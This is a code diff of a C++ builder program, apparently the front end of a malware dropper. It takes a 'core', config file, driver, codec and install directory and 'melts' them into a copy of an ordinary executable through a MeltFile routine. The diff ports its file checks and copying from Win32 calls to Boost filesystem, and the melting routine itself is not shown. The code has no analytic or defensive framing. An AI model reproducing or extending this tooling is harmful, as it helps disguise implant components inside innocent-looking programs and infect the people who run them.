@@ -3,23 +3,27 @@
 
 #pragma warning ( disable: 4996 )
 
-#include "stdafx.h"
-#include <Windows.h>
+#include <string>
+#include <iostream>
+using namespace std;
+
+#include <boost/filesystem.hpp>
+namespace bf = boost::filesystem;
+
+#include "common.h"
 #include "dropper.h"
 
 #include "MeltFile.h"
 
-int _tmain(int argc, _TCHAR* argv[])
+int _tmain(int argc, char* argv[])
 {
 	HMODULE hDropper;
 	HANDLE hFile;
 	BOOL ret = FALSE;
 	CHAR szOutputFile[MAX_PATH];
-	TCHAR *wsExeFile; 
-	TCHAR *wsOutputFile;
 	MelterStruct MS;
 	
-	ZeroMemory(&MS, sizeof(MelterStruct));
+	memset(&MS, 0, sizeof(MelterStruct));
 	MS.manifest = FALSE;
 	
 	if (argc != 9) {
@@ -48,60 +52,54 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("%s %s\n", argv[1], MS.core);
 
 	sprintf(MS.conf, "%s", argv[2]);
-	if (_tcscmp(argv[3], "null")) {
+	if (strcmp(argv[3], "null")) {
 		sprintf(MS.driver, "%s", argv[3]);
 	}
-	if (_tcscmp(argv[4], "null")) {
+	if (strcmp(argv[4], "null")) {
 		sprintf(MS.codec, "%s", argv[4]);
 	}
 	printf("Instdir = %s\n", argv[5]);
 	sprintf(MS.instdir, "%s", argv[5]);
 
 	printf("%s %s\n", argv[5], MS.instdir);
-	
-	if (!_tcscmp(argv[6], "1") )
+
+	if (!strcmp(argv[6], "1") )
 		MS.manifest = TRUE;
 	
-	wsExeFile = _tcsdup(argv[7]);
-	wsOutputFile = _tcsdup(argv[8]);
+	bf::path coreFile = argv[1];
+	bf::path configFile = argv[2];
+	bf::path driverFile = argv[3];
+	bf::path codecFile = argv[4];
+	bf::path exeFile = argv[7];
+	bf::path outputFile = argv[8];
 	
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
 	/************************************************************************/
 	
-	if ((hFile = CreateFile(wsExeFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find the input exe file [%s]\n", wsExeFile);
+	if ( !bf::exists(exeFile) ) {
+		cout << "Cannot find the input exe file [" << exeFile << "]" << endl;
 		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
 	}
 	
-	if ((hFile = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find the core file [%s]\n", argv[1]);
+	if ( !bf::exists(coreFile) ) {
+		cout << "Cannot find the core file [" << coreFile << "]" << endl;
 		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
 	}
 	
-	if ((hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find the config file [%s]\n", argv[2]);
+	if ( !bf::exists(configFile) ) {
+		cout << "Cannot find the config file [" << configFile << "]" << endl;
 		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-	
-	if ((hFile = CreateFile(argv[3], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find the driver file [%s]\n", argv[3]);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
 	}
 
-	if ((hFile = CreateFile(argv[4], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find the codec file [%s]\n", argv[4]);
+	if ( !bf::exists(driverFile) ) {
+		cout << "Cannot find the driver file [" << driverFile << "]" << endl;
 		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
+	}
+
+	if ( !bf::exists(codecFile) ) {
+		cout << "Cannot find the codec file [" << codecFile << "]" << endl;
+		return ERROR_EMBEDDING;
 	}
 
 	/************************************************************************/
@@ -115,14 +113,13 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("DRIVER        [%s]\n", (MS.driver) ? MS.driver : "null");
 	printf("CODEC         [%s]\n", (MS.codec) ? MS.codec : "null");
 	printf("MANIFEST      [%d]\n", MS.manifest);
-	printf("INPUT         [%s]\n", wsExeFile);
-	printf("OUTPUT        [%s]\n\n", wsOutputFile);
+	cout << "INPUT         [" << exeFile << "]" << endl;
+	cout << "OUTPUT        [" << outputFile << "]" << endl << endl;
 	
-	if (!CopyFile(wsExeFile, wsOutputFile, FALSE) ) {
-		printf("Cannot create output file [%s]\n", wsOutputFile);
+	bf::copy_file(exeFile, outputFile);
+	if ( !bf::exists(outputFile) ) {
+		cout << "Cannot create output file [" << outputFile << "]" << endl;
 		return ERROR_OUTPUT;
-	} else {
-		sprintf(szOutputFile, "%s", wsOutputFile);
 	}
 	
 	/************************************************************************/
@@ -131,32 +128,28 @@ int _tmain(int argc, _TCHAR* argv[])
 	
 	try {
 		int ret = MeltFile(
-			wsExeFile,
-			wsOutputFile,
+			exeFile.string().c_str(),
+			outputFile.string().c_str(),
 			&MS
 			);
 	} catch (...) {
-		printf("Error while running dropper\n");
-		DeleteFile(wsOutputFile);
+		cout << "Error while running dropper" << endl;
+		bf::remove(outputFile);
 		return ERROR_POLYMER;
 	} 
 	
 	if(ret) {
+		bf::remove(outputFile);
 		if ( 0 ) {
-			printf("Error embedding manifest: try to change melting EXE!\n");
-			DeleteFile(wsOutputFile);
+			cout << "Error embedding manifest: try to change melting EXE!" << endl;
 			return ERROR_MANIFEST;
 		} else {
-			DWORD err = GetLastError();
-			printf("Error building exe [%d]\n", err);
-			DeleteFile(wsOutputFile);
+			cout << "Error building exe" << endl;
 			return ERROR_OUTPUT;
 		}
 	}
 	
-	printf("Output file melted... ok\n");
+	cout << "Output file melted... ok" << endl;
 	
-	// FreeLibrary(hDropper);
-	
-	return ERROR_SUCCESS;
+	return 0;
 }
